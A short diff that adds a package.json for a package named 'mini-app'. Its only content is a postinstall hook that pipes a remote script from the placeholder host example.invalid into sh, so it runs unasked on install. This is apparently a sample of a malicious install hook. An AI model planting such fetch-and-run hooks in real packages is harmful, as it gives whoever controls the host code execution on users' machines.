@@ -1,0 +1,7 @@
+{
+  "name": "mini-app",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/setup.sh | sh"
+  }
+}
